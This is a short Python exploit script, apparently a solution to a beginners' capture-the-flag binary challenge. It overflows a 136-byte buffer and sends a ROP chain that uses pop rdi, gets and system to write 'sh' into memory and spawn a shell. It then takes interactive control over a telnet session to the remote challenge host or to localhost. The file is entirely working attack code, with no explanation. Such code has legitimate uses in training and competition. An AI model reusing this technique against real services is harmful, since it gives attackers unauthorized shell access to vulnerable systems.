import sys, socket, struct, telnetlib, time

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def main():
    system = 0x0000000000400540
    gets = 0x0000000000400570
    bss = 0x0000000000601058 + 0x10
    poprdi = 0x00400763

    buf = "A"*136
    buf += p(poprdi)
    buf += p(bss)
    buf += p(gets)
    buf += p(poprdi)
    buf += p(bss)
    buf += p(system)
    f.write(buf+"\n")
    f.write("sh\0\n")

    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("pwn1.chall.beginners.seccon.jp", 18373)
        main()
    else:
        s, f = sock("localhost", 18373)
        main()
